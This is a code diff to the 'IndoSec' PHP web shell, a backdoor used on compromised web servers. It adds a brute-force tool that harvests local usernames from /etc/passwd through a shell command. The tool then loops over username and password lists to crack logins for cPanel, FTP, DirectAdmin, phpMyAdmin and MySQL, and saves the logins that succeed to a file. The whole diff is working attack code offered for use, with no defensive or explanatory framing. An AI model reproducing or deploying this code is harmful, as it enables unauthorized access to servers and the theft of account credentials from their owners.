@@ -58,7 +58,7 @@ if (@function_exists('ini_set')) {
 /* Configurasi */
 $aupas 					= "54062f3bf6377d42b4fab7c8fedfc7da"; // IndoSec
 $_SESSION["password"] 	= $aupas;
-$mode					= "prod";
+$mode					= "debug";
 $BASE_URL				= $mode === "prod" ? "https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main" : "http://localhost/www/percobaan/ids-shell";
 
 function curlRequest($url)
@@ -452,6 +452,67 @@ function actionMultiDelete($dir) {
 	return false;
 }
 
+function curlRequestCrack($info)
+{
+	$options 	= array();
+	$ch 		= curl_init();
+
+	if($info["login"] == "cp") $url = $info['protocol'].$info['url'].':'.$info['port'];
+	if($info["login"] == "ftp") $url = $info['protocol'].$info['url'];
+	if($info["login"] == "DirectAdmin") $url = $info['protocol'].$info['url'].':'.$info['port'].'/CMD_LOGIN';
+	if($info["login"] == "DirectAdminMysql") $url = $info['protocol'].$info['url'].'/phpmyadmin';
+
+	$options["CURLOPT_URL"] = $url;
+	$options["CURLOPT_USERAGENT"] = "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0";
+	$options["CURLOPT_RETURNTRANSFER"] = 1;
+	if($info["login"] == "ftp" || $info["login"] == "DirectAdmin" || $info["login"] == "DirectAdminMysql") {
+		$options["CURLOPT_USERPWD"] = $info["username"].":".$info["password"];
+	}
+	if($info["login"] == "cp" || $info["login"] == "DirectAdmin" || $info["login"] == "DirectAdminMysql") {
+		$options["CURLOPT_SSL_VERIFYPEER"] = 0;
+		$options["CURLOPT_SSL_VERIFYHOST"] = 0;
+		$options["CURLOPT_HEADER"] = 0;
+		$options["CURLOPT_FOLLOWLOCATION"] = 1;
+	}
+	if($info["login"] == "cp") {
+		$options["CURLOPT_HTTPHEADER"] = array("Authorization: Basic ". base64_encode($info["username"].":".$info["password"]));
+	}
+	if($info["login"] == "DirectAdminMysql") {
+		$options["CURLOPT_HTTPAUTH"] = CURLAUTH_ANY;
+	}
+	curl_setopt_array($ch, $options);
+	$result = @curl_exec($ch);
+	$curl_errno = curl_errno($ch);
+	$curl_error = curl_error($ch);
+	curl_close($ch);
+
+	if ($curl_errno > 0) {return "<font color='red'>Error: $curl_error</font><br>";}
+	elseif(preg_match('/CMD_FILE_MANAGER|frameset/i',$result)){return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';}
+	elseif(preg_match('/filemanager/i',$result)){return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';}
+	elseif(preg_match('/(\d+):(\d+)/i',$result)){return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';}
+	
+}
+
+function crackFunctionLogin($info){
+	if($info["login"] == "mysqli_connect")
+	{
+		if(@mysqli_connect($info['url'].':'.$info['port'],$info['username'],$info['password']))
+		{
+			return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
+		}
+	} else 
+	{
+		if($con=@ftp_connect($info['url'],$info['port']))
+		{
+			if($con)
+			{
+				$login=@ftp_login($con,$info['username'],$info['password']);
+				if($login) return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
+			}
+		}
+	}
+}
+
 function newfile(){
 
 	global $path;
@@ -770,7 +831,6 @@ function backup() {
 
 }
 
-
 function dashboard() {
 
 	global $ver;
@@ -891,6 +951,48 @@ function console()
 	}
 }
 
+function bruteforce()
+{
+	if(!isset($_POST["crack"])) {
+		$ulist = (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN'?exe("cut -d: -f1 /etc/passwd"):"");
+		pages("bruteforce", ["Tools", "Brute Force"], array("{{OUTPUT}}", "{{ULIST}}"), array("", $ulist));
+	} else {
+		$ulist = (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN'?exe("cut -d: -f1 /etc/passwd"):"");
+		$url = $_POST['url'];
+		$port = $_POST['port'];
+		$protocol = $_POST['protocol'];
+		$login = $_POST['login'];
+		$ulistname = $_POST['ulist'];
+		$plistname = $_POST['plist'];
+		$save = $_POST['save'];
+
+		$data = array();
+		$output = array();
+
+		foreach (explode("\n",$ulistname) as $username) {
+			foreach (explode("\n",$plistname) as $password) {
+				$data["login"] = trim($login);
+				$data["url"] = trim($url);
+				$data["port"] = trim($port);
+				$data["protocol"] = trim($protocol);
+				$data["username"] = trim($username);
+				$data["password"] = trim($password);
+
+				if($login == "mysqli_connect" || $login == "ftp_connect") $output[] = crackFunctionLogin($data);
+				else $output[] =  curlRequestCrack($data);
+			}
+		}
+
+		$fp = fopen($save, "w");
+		fwrite($fp, implode(" \n", $output));
+		fclose($fp);
+
+		pages("bruteforce", ["Tools", "Brute Force"], array("{{OUTPUT}}", "{{ULIST}}"), array(implode(" ", $output), $ulist));
+	}
+	
+
+}
+
 if(isset($_GET["page"]))
 {
 	$page = $_GET["page"];
@@ -917,6 +1019,7 @@ if(isset($_GET["page"]))
 	if($page == "console") console();
 	if($page == "adminer") adminer();
 	if($page == "network") network();
+	if($page == "bruteforce") bruteforce();
 
 	// Info
 	if($page == "about") pages($page, ["About"]);
